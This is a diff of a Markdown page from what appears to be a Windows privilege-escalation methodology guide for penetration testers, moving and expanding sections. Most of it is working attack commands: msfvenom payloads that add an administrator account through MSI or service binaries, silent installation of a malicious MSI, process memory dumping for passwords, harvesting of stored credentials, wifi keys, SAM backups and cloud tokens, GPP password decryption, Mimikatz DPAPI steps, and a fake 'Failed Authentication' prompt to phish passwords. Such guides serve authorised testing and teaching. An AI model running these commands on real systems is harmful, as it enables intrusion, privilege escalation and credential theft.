@@ -45,16 +45,6 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
-### Vulnerable Drivers
-
-Look for possible **third party weird/vulnerable** drivers
-
-```text
-driverquery
-driverquery.exe /fo table
-driverquery /SI
-```
-
 ### Environment
 
 Any credential/Juicy info saved in the env variables?
@@ -75,17 +65,91 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
-## Antivirus and Detectors
-
-### LAPS
-
-**LAPS** allows you to **manage the local Administrator password** \(which is **randomised**, unique, and **changed regularly**\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.
+### Internet Settings
 
 ```bash
-reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
-When using LAPS, 2 new attributes appear in the computer objects of the domain: _ms-msc-AdmPwd_ and _ms-mcs-AdmPwdExpirationTime._ These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...
+### Drives
+
+```bash
+wmic logicaldisk get caption || fsutil fsinfo drives
+wmic logicaldisk get caption,description,providername
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+```
+
+### WSUS
+
+You can compromise the system if the updates are not requested using http**S** but http.
+
+You start by checking if the network uses a non-SSL WSUS update by running the following:
+
+```text
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+```
+
+If you get a reply such as:
+
+```bash
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
+```
+
+And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.
+
+Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
+
+You can use: [Wsuxploit](https://github.com/pimps/wsuxploit) - This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.
+
+{% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\).pdf" %}
+
+## AlwaysInstallElevated
+
+**If** these 2 registers are **enabled** \(value is **0x1**\), then users of any privilege can **install** \(execute\) **`*.msi`** files as NT AUTHORITY\**SYSTEM**.
+
+```bash
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### Metasploit payloads
+
+```bash
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
+```
+
+If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
+
+### PowerUP
+
+Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
+
+```text
+Write-UserAddMSI
+```
+
+Just execute the created binary to escalate privileges.
+
+### MSI Wrapper
+
+Read this tutorial to learn how to create a MSI wrapper using this tools:
+
+{% page-ref page="msi-wrapper.md" %}
+
+### MSI Installation
+
+To execute the **installation** of the **malicious `.msi`** file in **background:**
+
+```text
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
+```
+
+To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_
+
+## Antivirus and Detectors
 
 ### Audit Settings
 
@@ -101,6 +165,52 @@ Windows Event Forwarding, is interesting to know where are the logs sent
 
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
+```
+
+### LAPS
+
+**LAPS** allows you to **manage the local Administrator password** \(which is **randomised**, unique, and **changed regularly**\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.
+
+```bash
+reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+```
+
+When using LAPS, 2 new attributes appear in the computer objects of the domain: _ms-msc-AdmPwd_ and _ms-mcs-AdmPwdExpirationTime._ These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...
+
+### WDigest
+
+If active, **plain-text passwords are stored in LSASS** \(Local Security Authority Subsystem Service\).  
+[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
+
+```text
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+```
+
+### LSA Protection
+
+Microsoft in **Windows 8.1 and later** has provided additional protection for the LSA to **prevent** untrusted processes from being able to **read its memory** or to inject code.  
+[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
+
+```text
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
+```
+
+### Credentials Guard
+
+**Credential Guard** is a new feature in Windows 10 \(Enterprise and Education edition\) that helps to protect your credentials on a machine from threats such as pass the hash.  
+****[**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)\*\*\*\*
+
+```text
+reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
+```
+
+### Cached Credentials
+
+**Domain credentials** are used by operating system components and are **authenticated** by the **Local** **Security Authority** \(LSA\). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data.  
+[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
+
+```text
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
 
 ### AV
@@ -132,7 +242,18 @@ C:\Windows\Tasks
 C:\windows\tracing
 ```
 
+### UAC
+
+UAC is used to allow an **administrator user to not give administrator privileges to each process executed**. This is **achieved using default** the **low privileged token** of the user.  
+[**More information about UAC here**](../credentials.md#uac).
+
+```text
+ reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
+```
+
 ## Users & Groups
+
+### Enumerate Users & Groups
 
 You should check if any of the groups where you belong have interesting permissions
 
@@ -151,6 +272,33 @@ Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
+### Privileged groups
+
+If you **belongs to some privileged group you may be able to escalate privileges**. Learn about privileged groups and how to abuse them to escalate privileges here:
+
+{% page-ref page="../active-directory-methodology/privileged-accounts-and-token-privileges.md" %}
+
+### Token manipulation
+
+**Learn more** about what is a **token** in this page: [**Windows Tokens**](../credentials.md#access-tokens).  
+Check the following page to **learn about interesting tokens** and how to abuse them:
+
+{% page-ref page="privilege-escalation-abusing-tokens.md" %}
+
+### Logged users / Sessions
+
+```text
+qwinsta
+klist sessions
+```
+
+### Home folders
+
+```text
+dir C:\Users
+Get-ChildItem C:\Users
+```
+
 ### Password Policy
 
 ```text
@@ -163,76 +311,12 @@ net accounts
 powershell -command "Get-Clipboard"
 ```
 
-## Token manipulation
+## Running Processes
 
-**Learn more** about what is a **token** in this page: [**Windows Tokens**](../credentials.md#access-tokens).  
-Check the following page to **learn about interesting tokens** and how to abuse them:
+### File and Folder Permissions
 
-{% page-ref page="privilege-escalation-abusing-tokens.md" %}
-
-## Drives
-
-```bash
-wmic logicaldisk get caption || fsutil fsinfo drives
-wmic logicaldisk get caption,description,providername
-Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
-```
-
-## Network
-
-Check for **restricted services** from the outside
-
-```bash
-netstat -ano #Opened ports?
-```
-
-List all network interfaces, IP, and DNS.
-
-```text
-ipconfig /all
-Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
-Get-DnsClientServerAddress -AddressFamily IPv4 | ft
-```
-
-List current routing table
-
-```text
-route print
-Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
-```
-
-List the ARP table
-
-```text
-arp -A
-Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
-```
-
-More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)
-
-## Software
-
-Check all the installed software, maybe you can overwrite some binary or perform some DLL Hijacking by creating a DLL in the same folder.
-
-```bash
-dir /a "C:\Program Files"
-dir /a "C:\Program Files (x86)"
-reg query HKEY_LOCAL_MACHINE\SOFTWARE
-
-Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
-Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
-```
-
-### Run at startup
-
-**Check if you can overwrite some registry or binary that is going to be executed by other user.  
-Read** the **following page** to learn more about interesting autoruns locations to escalate privileges:
-
-{% page-ref page="privilege-escalation-with-autorun-binaries.md" %}
-
-## Running processes
-
-Check if you can overwrite some binary running or if you can dump the memory of any process containing passwords.
+First of all, listing the processes **check for passwords inside the command line of the process**.  
+Check if you can **overwrite some binary running** or if you have write permissions of the binary folder to exploit possible [**DLL Hijacking attacks**](dll-hijacking.md):
 
 ```bash
 Tasklist /SVC #List processes running and services
@@ -255,7 +339,7 @@ for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executabl
 )
 ```
 
-#### Checking permissions of the folders of the processes binaries \(dll injection\)
+#### Checking permissions of the folders of the processes binaries \([DLL Hijacking](dll-hijacking.md)\)
 
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -265,13 +349,17 @@ for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executabl
 
 ### Memory Password mining
 
-You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the credentials in clear text in memory, try to dump the memory and read the credentials.
+You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the **credentials in clear text in memory**, try to dump the memory and read the credentials.
 
 ```text
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 
-{% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\).pdf" %}
+### Insecure GUI apps
+
+**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**
+
+Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"
 
 ## Services
 
@@ -355,8 +443,7 @@ Other Permissions can be used to escalate privileges:
 
 ### Services binaries weak permissions
 
-Check if you can modify the binary that is executed by a service.
-
+**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located \([**DLL Hijacking**](dll-hijacking.md)\)**.**  
 You can get every binary that is executed by a service using **wmic** \(not in system32\) and check your permissions using **icacls**:
 
 ```bash
@@ -432,20 +519,124 @@ You can manually create a service binary with metasploit:
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
 
-## DLL Hijacking
+## Applications
 
-Programs usually can't function by themselves, they have a lot of resources they need to hook into \(mostly DLL's but also proprietary files\). If a **program or service loads a file from a directory we have write access to**, we can abuse that to **pop a shell with the privileges the program runs with**.
+### Installed Applications
 
-**In order to learn more about how to** [**discover and exploit Dll Hijacking vulnerabilities read this**](dll-hijacking.md)**.**
+Check **permissions of the binaries** \(maybe you can overwrite one and escalate privileges\) and of the **folders** \([DLL Hijacking](dll-hijacking.md)\).
 
-## Installed Applications
+```bash
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
 
-```text
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
-## Windows Subsystem for Linux \(wsl\)
+### Write Permissions
+
+Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account \(schedtasks\).
+
+A way to find weak folder/files permissions in the system is doing:
+
+```bash
+accesschk.exe /accepteula 
+# Find all weak folder permissions per drive.
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+accesschk.exe -uwdqs "Everyone" c:\
+# Find all weak file permissions per drive.
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+accesschk.exe -uwdqs "Everyone" c:\*.*
+```
+
+```bash
+icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
+icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
+```
+
+```bash
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
+
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
+```
+
+### Run at startup
+
+**Check if you can overwrite some registry or binary that is going to be executed by a different user.  
+Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:
+
+{% page-ref page="privilege-escalation-with-autorun-binaries.md" %}
+
+### Drivers
+
+Look for possible **third party weird/vulnerable** drivers
+
+```text
+driverquery
+driverquery.exe /fo table
+driverquery /SI
+```
+
+## Network
+
+### Shares
+
+```bash
+net view #Get a list of computers
+net view /all /domain [domainname] #Shares on the domains
+net view \\computer /ALL #List shares of a computer
+net use x: \\computer\share #Mount the share locally
+net share #Check current shares
+```
+
+### hosts file
+
+Check for other known computers hardcoded on the hosts file
+
+```text
+type C:\Windows\System32\drivers\etc\hosts
+```
+
+### Network Interfaces & DNS
+
+```text
+ipconfig /all
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+```
+
+### Open Ports
+
+Check for **restricted services** from the outside
+
+```bash
+netstat -ano #Opened ports?
+```
+
+### Routing Table
+
+```text
+route print
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+```
+
+### ARP Table
+
+```text
+arp -A
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
+```
+
+### Firewall Rules
+
+\*\*\*\*[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **\(list rules, create rules, turn off, turn off...\)**
+
+More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)
+
+### Windows Subsystem for Linux \(wsl\)
 
 ```text
 C:\Windows\System32\bash.exe
@@ -467,11 +658,21 @@ To easily start bash as root, you can try `--default-user root`
 
  You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
-## Credentials
+## Windows Credentials
 
-### [MSF-Credentials Plugin](https://github.com/carlospolop/MSF-Credentials)
+### Winlogon Credentials
 
-I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.
+```bash
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
+
+#Other way
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
+```
 
 ### Credentials manager / Windows vault
 
@@ -543,6 +744,27 @@ netsh wlan show profile <SSID> key=clear
 #Oneliner to extract all wifi passwords
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
+
+### Saved RDP Connections
+
+You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`  
+and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
+
+### Recently Run Commands
+
+```text
+HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+```
+
+### **Remote Desktop Credential Manager**
+
+```text
+%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+```
+
+Use the **Mimikatz** `dpapi::rd`g module with appropriate `/masterkey` to **decrypt any .rdg files**  
+You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
 
 ### AppCmd.exe
 
@@ -629,6 +851,31 @@ function Get-ApplicationHost {
 }
 ```
 
+### SCClient / SCCM
+
+Check if `C:\Windows\CCM\SCClient.exe` exists .  
+Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading \(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**\).**
+
+```bash
+$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
+if ($result) { $result }
+else { Write "Not Installed." }
+```
+
+## Files and Registry \(Credentials\)
+
+### Putty Creds
+
+```bash
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
+```
+
+### Putty SSH Host Keys
+
+```text
+reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
+```
+
 ### SSH keys in registry
 
 SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys`  so you should check if there is anything interesting in there:
@@ -641,38 +888,7 @@ If you find any entry inside that path it will probably be a saved SSH key. It i
 
 More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-### SCClient / SCCM
-
-Check if `C:\Windows\CCM\SCClient.exe` exists .  
-Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading \(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**\).**
-
-```bash
-$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
-if ($result) { $result }
-else { Write "Not Installed." }
-```
-
-### **Remote Desktop Credential Manager**
-
-```text
-%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
-```
-
-Use the **Mimikatz** `dpapi::rd`g module with appropriate `/masterkey` to **decrypt any .rdg files**  
-You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
-
-### Ask for credentials
-
-You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them \(notice that **asking** the client directly for the **credentials** is really **risky**\):
-
-```text
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
-```
-
-### Common files with credentials
-
-#### Unattended files
+### Unattended files
 
 ```text
 C:\Windows\sysprep\sysprep.xml
@@ -689,7 +905,7 @@ C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
 
-You can also search for these files using metasploit: _post/windows/gather/enum\_unattend_
+You can also search for these files using **metasploit**: _post/windows/gather/enum\_unattend_
 
 Example content_:_
 
@@ -712,7 +928,7 @@ Example content_:_
     </UserAccounts>
 ```
 
-#### SAM & SYSTEM backups
+### SAM & SYSTEM backups
 
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
@@ -724,11 +940,23 @@ Example content_:_
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
-#### McAffe SiteList.xml
+### Cloud Credentials
+
+```bash
+##From user home
+.aws\credentials
+AppData\Roaming\gcloud\credentials.db
+AppData\Roaming\gcloud\legacy_credentials
+AppData\Roaming\gcloud\access_tokens.db
+.azure\accessTokens.json
+.azure\azureProfile.json
+```
+
+### McAffe SiteList.xml
 
 Search for a file called **SiteList.xml**
 
-#### Cached GPP Pasword
+### Cached GPP Pasword
 
 Before KB2928120 \(see MS14-025\), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty "cpassword" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.
 
@@ -748,19 +976,7 @@ Search in ****_**C:\ProgramData\Microsoft\Group Policy\history**_  or in _**C:\D
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
-#### Cloud Credentials
-
-```bash
-##From user home
-.aws\credentials
-AppData\Roaming\gcloud\credentials.db
-AppData\Roaming\gcloud\legacy_credentials
-AppData\Roaming\gcloud\access_tokens.db
-.azure\accessTokens.json
-.azure\azureProfile.json
-```
-
-#### IIS Web Config
+### IIS Web Config
 
 ```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -788,7 +1004,26 @@ Example of web.config with credentials:
 </authentication>
 ```
 
-### More possible files with credentials
+### Logs
+
+```bash
+# IIS
+C:\inetpub\logs\LogFiles\*
+
+#Apache
+Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### Ask for credentials
+
+You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them \(notice that **asking** the client directly for the **credentials** is really **risky**\):
+
+```text
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+```
+
+### **Possible filenames containing credentials**
 
 Known files that some time ago contained **passwords** in **clear-text** or **Base64**
 
@@ -854,50 +1089,20 @@ TypedURLs       #IE
 %WINDIR%\system32\CCM\logs\*.log
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
-dir c:*vnc.ini /s /b
-dir c:*ultravnc.ini /s /b
 ```
 
 Search all of the proposed files:
 
 ```text
 cd C:\
-dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"
+dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
 ```
 
 ```text
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
 
-Check Logs \(IIS, Apache\)
-
-```bash
-# IIS
-C:\inetpub\logs\LogFiles\*
-
-#Apache
-Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
-```
-
-It is also a good idea to search for **files** that contain specific words \(like _password_\)
-
-```bash
-#Search suspicious files from filename
-dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\windows"
-
-#Search suspicious files from content
-findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
-findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\AppData\\Local \\WinXsX ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.CloudExperienceHost" 2>nul #filtered output
-```
-
-_**post/windows/gather/credentials/\***_
-
-#### Home credentials files
-
-You should also look inside the home folder for files called _\*password\*_ or _\*credential\*_ ot something similar.
-
-#### Credentials in the RecycleBin
+### Credentials in the RecycleBin
 
 You should also check the Bin to look for credentials inside it
 
@@ -905,32 +1110,22 @@ To **recover passwords** saved by several programs you can use: [http://www.nirs
 
 ### Inside the registry
 
-#### Winlogon credentials
-
-```bash
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
-```
-
 #### Other possible registry keys with credentials
 
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" #Autologin
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
 reg query "HKCU\Software\TightVNC\Server"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s #Check the values saved in each session, user/password could be there
 reg query "HKCU\Software\OpenSSH\Agent\Key"
-
-# Search for passwords inside all the registry 
-reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
-reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
 ```
 
-[Extract openssh keys from registry.](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)\*\*\*\*
 
 ### Tools that search for passwords
 
-The tool [SessionGopher](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.
+
+The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)
 
 ```bash
 Import-Module path\to\SessionGopher.ps1;
@@ -976,104 +1171,6 @@ REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 
-## AlwaysInstallElevated
-
-**If** these 2 registers are **enabled** \(value is **0x1**\), then users of any privilege can **install** \(execute\) **`*.msi`** files as NT AUTHORITY\**SYSTEM**.
-
-```bash
